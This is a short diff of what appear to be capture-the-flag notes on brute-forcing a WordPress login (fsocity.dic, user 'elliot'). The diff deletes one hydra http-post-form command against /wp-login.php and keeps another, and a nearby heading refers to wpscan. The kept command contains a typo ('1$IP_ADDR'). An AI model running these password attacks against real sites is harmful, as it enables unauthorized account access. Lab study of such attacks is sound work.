@@ -30,7 +30,6 @@ hydra -L fsocity.di -p example $IP_ADDR http-post-form "/wp-login.php:log=^USER^
 Password
 ```bash
 IP_ADDR=
-hydra -L example -P fsocity.dic $IP_ADDR http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you enter for the username" -t 30
 hydra -l elliot -P fsocity.dic 1$IP_ADDR http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F$IP_ADDR%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
 ```
 ### How to bruteforce input fields with wpscan
